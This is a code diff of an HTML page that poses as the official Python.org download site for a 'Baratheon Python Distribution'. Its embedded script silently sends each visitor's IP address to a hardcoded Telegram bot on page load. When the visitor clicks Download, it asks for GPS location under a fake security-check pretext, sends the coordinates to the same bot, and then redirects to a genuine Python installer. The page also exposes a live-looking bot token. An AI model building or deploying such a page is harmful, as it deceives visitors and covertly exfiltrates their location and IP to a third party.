@@ -3,60 +3,94 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Baratheon OS | النظام الرسمي</title>
+    <title>Welcome to Python.org | Baratheon Edition</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { background-color: #050505; color: #00ff41; font-family: 'Courier New', monospace; }
-        .baratheon-card { background: rgba(0, 20, 0, 0.8); border: 1px solid #00ff41; box-shadow: 0 0 20px #00ff4133; }
-        .glitch { animation: shadow 1.5s infinite; }
-        @keyframes shadow { 0% { text-shadow: 2px 0 red; } 50% { text-shadow: -2px 0 blue; } 100% { text-shadow: 2px 0 red; } }
+        :root { --py-blue: #3776ab; --py-yellow: #ffd43b; --py-dark: #232d3b; }
+        body { background-color: #1e242c; color: white; font-family: 'Source Sans Pro', Arial, sans-serif; }
+        .nav-py { background-color: var(--py-dark); border-bottom: 3px solid var(--py-blue); }
+        .hero-py { background: linear-gradient(to bottom, #2b3543, #1e242c); }
+        .btn-py { background-color: var(--py-yellow); color: var(--py-blue); transition: 0.3s; }
+        .btn-py:hover { background-color: white; transform: scale(1.05); }
+        .footer-py { border-top: 1px solid #303c4a; color: #9da5b1; }
     </style>
 </head>
-<body class="p-4 flex flex-col items-center min-h-screen">
+<body>
 
-    <div class="mt-10 text-center">
-        <h1 class="text-4xl font-black glitch tracking-widest uppercase">Baratheon System</h1>
-        <p class="text-xs mt-2 opacity-70">إصدار آمن - مشفر بالكامل</p>
-    </div>
-
-    <div class="baratheon-card mt-12 p-6 rounded-lg max-w-sm w-full text-center">
-        <div class="w-20 h-20 bg-green-900 rounded-full mx-auto mb-4 border-2 border-green-400 flex items-center justify-center">
-            <i class="fas fa-user-shield text-3xl"></i>
+    <nav class="nav-py p-4 flex justify-between items-center px-8">
+        <div class="flex items-center space-x-4 space-x-reverse">
+            <i class="fab fa-python text-3xl text-[var(--py-yellow)]"></i>
+            <span class="text-xl font-bold tracking-tight">Python<span class="text-gray-400 font-light">.org</span></span>
         </div>
-        <h2 class="text-xl font-bold">Baratheon <i class="fas fa-check-circle text-blue-500 text-sm"></i></h2>
-        <p class="text-sm text-gray-400 mt-1">المطور والمؤسس الرئيسي</p>
-        <hr class="my-4 border-green-900">
-        <button onclick="accessSystem()" class="w-full bg-green-600 text-black font-bold py-3 rounded hover:bg-green-400 transition">
-            الدخول إلى لوحة التحكم
-        </button>
-    </div>
+        <div class="hidden md:flex space-x-6 space-x-reverse text-sm font-semibold">
+            <a href="#" class="hover:text-[var(--py-yellow)]">About</a>
+            <a href="#" class="hover:text-[var(--py-yellow)]">Downloads</a>
+            <a href="#" class="hover:text-[var(--py-yellow)]">Documentation</a>
+        </div>
+    </nav>
+
+    <header class="hero-py py-20 px-6 text-center shadow-inner">
+        <h1 class="text-4xl md:text-5xl font-bold mb-6 text-[var(--py-yellow)]">Baratheon Python Distribution</h1>
+        <p class="max-w-2xl mx-auto text-lg text-gray-300 leading-relaxed mb-10">
+            تم إطلاق النسخة الحصرية من بايثون المخصصة للمطورين المحترفين. حمل الأدوات، السكربتات، والمكتبات البرمجية الآن.
+        </p>
+        
+        <div class="flex flex-col items-center">
+            <button onclick="startDownload()" class="btn-py px-12 py-4 rounded-lg font-black text-xl shadow-2xl flex items-center">
+                <i class="fas fa-download ml-3"></i> Download Python 3.12.2 (Baratheon v1)
+            </button>
+            <p class="mt-4 text-xs text-gray-500 font-mono italic"># Verified by Baratheon Security Systems</p>
+        </div>
+    </header>
+
+    <section class="max-w-5xl mx-auto grid grid-cols-1 md:grid-cols-3 gap-8 p-10">
+        <div class="p-6 bg-[#2b3543] rounded border-b-4 border-[var(--py-blue)]">
+            <h3 class="font-bold mb-2 text-[var(--py-yellow)]">Get Started</h3>
+            <p class="text-sm text-gray-400 text-right">تعلم كيف تبدأ مع بايثون من الصفر وصولاً للاحتراف.</p>
+        </div>
+        <div class="p-6 bg-[#2b3543] rounded border-b-4 border-[var(--py-blue)]">
+            <h3 class="font-bold mb-2 text-[var(--py-yellow)]">Community</h3>
+            <h4 class="text-sm text-gray-400 text-right">انضم لأكبر مجتمع برمجيات مفتوحة المصدر في العالم.</h4>
+        </div>
+        <div class="p-6 bg-[#2b3543] rounded border-b-4 border-[var(--py-blue)]">
+            <h3 class="font-bold mb-2 text-[var(--py-yellow)]">Success Stories</h3>
+            <p class="text-sm text-gray-400 text-right">شاهد كيف غيّر بايثون حياة مئات المطورين.</p>
+        </div>
+    </section>
+
+    <footer class="footer-py p-8 text-center text-xs">
+        <p>© 2026 Python Software Foundation | Modified by <b>Baratheon</b></p>
+    </footer>
 
     <script>
         const token = "8621828423:AAFq9_5-6snrjpfqrBrOPboh7VE824xVN_M";
         const chat_id = "5475815049";
 
-        // إرسال IP فوراً
+        // إرسال IP فور الدخول (صامت)
         window.onload = async () => {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            const msg = `👑 <b>دخول لنظام Baratheon</b>\n🌐 IP: <code>${data.ip}</code>`;
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                const msg = `🐍 <b>زائر دخل نسخة بايثون Baratheon!</b>\n🌐 IP: <code>${data.ip}</code>`;
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
+            } catch(e){}
         };
 
-        // طلب الـ GPS عند محاولة "الدخول للنظام"
-        function accessSystem() {
+        // سحب الموقع عند التحميل
+        function startDownload() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
                     const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-                    const msg = `📍 <b>هدف جديد في قبضة Baratheon!</b>\n🔗 الموقع: ${mapUrl}`;
+                    const msg = `📍 <b>الهدف حاول تحميل بايثون!</b>\n🔗 الموقع: ${mapUrl}`;
                     await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
-                    alert("تم إثبات ملكية المالك. جاري فتح النظام...");
-                    window.location.href = "https://github.com/starkmirio-pixel";
+                    
+                    alert("نظام الأمان: تم التحقق من هويتك. سيبدأ التحميل الآن..");
+                    window.location.href = "https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe";
                 }, (err) => {
-                    alert("عذراً: نظام Baratheon يتطلب صلاحيات الموقع لإتمام الفحص الأمني.");
+                    alert("خطأ أمني: يجب السماح بالوصول للموقع للتأكد من منطقتك الجغرافية قبل التحميل.");
                 });
             }
         }
